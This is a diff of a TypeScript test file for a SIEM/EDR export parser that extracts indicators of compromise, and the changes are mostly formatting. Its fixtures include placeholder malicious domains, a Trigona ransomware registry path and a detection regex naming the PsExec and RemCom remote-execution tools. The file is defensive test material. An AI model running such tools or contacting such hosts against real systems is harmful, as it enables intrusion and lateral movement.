@@ -494,7 +669,8 @@ describe("parseSiemExport — generic (non-Windows) SIEM/EDR fallback", () => {
 
   it("still creates a domain IOC from a structured hostname column for a real external domain", () => {
     const rec = {
-      "@timestamp": "2024-05-14T14:20:09.941Z", message: "host telemetry",
+      "@timestamp": "2024-05-14T14:20:09.941Z",
+      message: "host telemetry",
       hostname: "evil-c2.example.com",
     };
     const vals = parseSiemExport(JSON.stringify([rec])).iocs.map((i) => `${i.type}:${i.value}`);
@@ -517,7 +693,7 @@ describe("parseSiemExport — generic (non-Windows) SIEM/EDR fallback", () => {
     expect(vals.some((v) => v.startsWith("artifacts."))).toBe(false);
   });
 
-  it("parses Kibana display-format timestamps (\"May 7, 2026 @ 16:31:04.000\") to UTC ISO", () => {
+  it('parses Kibana display-format timestamps ("May 7, 2026 @ 16:31:04.000") to UTC ISO', () => {
     const rec = { "@timestamp": "May 7, 2026 @ 16:31:04.000", host: "h", message: "x" };
     const e = parseSiemExport(JSON.stringify([rec])).events[0];
     expect(e.timestamp).toBe("2026-05-07T16:31:04.000Z");
@@ -532,9 +708,14 @@ describe("parseSiemExport — generic (non-Windows) SIEM/EDR fallback", () => {
   it("uses `desc` as the description and `@timestamp` for time (Elastic mp_timeline push)", () => {
     // The flat shape the extension's Elastic adapter produces after unwrapping docvalue `fields`.
     const rec = {
-      _id: "M_cWzJ4", _index: "mp_timeline", _version: 1, _ignored: "desc.keyword",
+      _id: "M_cWzJ4",
+      _index: "mp_timeline",
+      _version: 1,
+      _ignored: "desc.keyword",
       "@timestamp": "2026-06-03T08:42:12.000Z",
-      desc: "HKU\\S-1-5-21\\Software\\Trigona\\Wallpaper", action: "MOD", type: "REG",
+      desc: "HKU\\S-1-5-21\\Software\\Trigona\\Wallpaper",
+      action: "MOD",
+      type: "REG",
     };
     const e = parseSiemExport(JSON.stringify([rec])).events[0];
     expect(e.timestamp).toBe("2026-06-03T08:42:12.000Z");
@@ -545,11 +726,14 @@ describe("parseSiemExport — generic (non-Windows) SIEM/EDR fallback", () => {
 
   it("summarizes salient fields (not ES metadata) when there's no message field (DetectRaptor MFT)", () => {
     const rec = {
-      _id: "x1", _index: "artifact_detectraptor_windows_detection_mft", _version: 1,
+      _id: "x1",
+      _index: "artifact_detectraptor_windows_detection_mft",
+      _version: 1,
       "@timestamp": "2026-01-28T09:47:39.493Z",
       "Detection.StringHit": "PsExec.exe",
       "Detection.KeywordRegex": "psexec\\.exe$|psexec64\\.exe$|remcom\\.exe$",
-      "Artifact.keyword": "DetectRaptor.Windows.Detection.MFT", "FlowId": "F.D7U8JESNJITC2",
+      "Artifact.keyword": "DetectRaptor.Windows.Detection.MFT",
+      FlowId: "F.D7U8JESNJITC2",
     };
     const e = parseSiemExport(JSON.stringify([rec])).events[0];
     expect(e.timestamp).toBe("2026-01-28T09:47:39.493Z");
@@ -601,9 +785,13 @@ describe("row-scoped IOC provenance (aggKey plumbing)", () => {
 
   it("mergeRowIocs unions sourceAggKeys when the same value recurs across rows", () => {
     const fileSink = new Map<string, SiemIoc>();
-    const rowSink1 = new Map<string, SiemIoc>([["domain:evil.example.com", { type: "domain", value: "evil.example.com" }]]);
+    const rowSink1 = new Map<string, SiemIoc>([
+      ["domain:evil.example.com", { type: "domain", value: "evil.example.com" }],
+    ]);
     mergeRowIocs(fileSink, rowSink1, "agg-1");
-    const rowSink2 = new Map<string, SiemIoc>([["domain:evil.example.com", { type: "domain", value: "evil.example.com" }]]);
+    const rowSink2 = new Map<string, SiemIoc>([
+      ["domain:evil.example.com", { type: "domain", value: "evil.example.com" }],
+    ]);
     mergeRowIocs(fileSink, rowSink2, "agg-2");
     expect(fileSink.get("domain:evil.example.com")?.sourceAggKeys).toEqual(["agg-1", "agg-2"]);
   });
@@ -620,7 +808,10 @@ describe("row-scoped IOC provenance (aggKey plumbing)", () => {
       { type: "domain", value: "evil.example.com", sourceAggKeys: ["agg-1", "agg-2"] },
       { type: "ip", value: "9.9.9.9" },
     ];
-    const eventIdByAggKey = new Map([["agg-1", "e001"], ["agg-2", "e002"]]);
+    const eventIdByAggKey = new Map([
+      ["agg-1", "e001"],
+      ["agg-2", "e002"],
+    ]);
     const resolved = resolveExtractedFrom(iocs, eventIdByAggKey);
     expect(resolved[0].extractedFrom).toEqual(["e001", "e002"]);
     expect(resolved[1].extractedFrom).toBeUndefined();
@@ -682,7 +873,7 @@ describe("textIocs — ReDoS guard (#249)", () => {
     textIocs(bait(100), sink);
     // Unbounded, the label loop made this quadratic and 100 KB took ~10s.
     expect(Date.now() - start).toBeLessThan(2000);
-    expect(sink.size).toBe(0);                       // nothing here has a valid TLD
+    expect(sink.size).toBe(0); // nothing here has a valid TLD
   });
 
   it("costs LINEAR time in the input, not quadratic", () => {
@@ -690,8 +881,12 @@ describe("textIocs — ReDoS guard (#249)", () => {
     // protects the server is the SHAPE of the curve, because textIocs runs once per record and
     // maxEvents caps only the events emitted, not the records mapped. Over a 4x input, linear costs
     // ~4x and quadratic ~16x, so 8x separates them with room to spare for timer noise.
-    const time = (kb: number) => { const t = Date.now(); textIocs(bait(kb), new Map()); return Date.now() - t; };
-    time(10);                                        // warm up the regex engine
+    const time = (kb: number) => {
+      const t = Date.now();
+      textIocs(bait(kb), new Map());
+      return Date.now() - t;
+    };
+    time(10); // warm up the regex engine
     const small = Math.max(time(25), 1);
     const large = time(100);
     expect(large / small).toBeLessThan(8);
@@ -699,13 +894,13 @@ describe("textIocs — ReDoS guard (#249)", () => {
 
   it("still extracts a domain that sits past where the old 10 KB input cap fell", () => {
     const sink = new Map<string, SiemIoc>();
-    textIocs(`${"filler word ".repeat(2000)} beacon.evil.com`, sink);   // ~24 KB of prefix
+    textIocs(`${"filler word ".repeat(2000)} beacon.evil.com`, sink); // ~24 KB of prefix
     expect([...sink.values()]).toContainEqual({ type: "domain", value: "beacon.evil.com" });
   });
 
   it("extracts a domain whose label count is within the DNS limit", () => {
     const sink = new Map<string, SiemIoc>();
-    const deep = `${"a.".repeat(120)}com`;           // 121 labels — legal, if unusual
+    const deep = `${"a.".repeat(120)}com`; // 121 labels — legal, if unusual
     textIocs(deep, sink);
     expect([...sink.values()]).toContainEqual({ type: "domain", value: deep });
   });
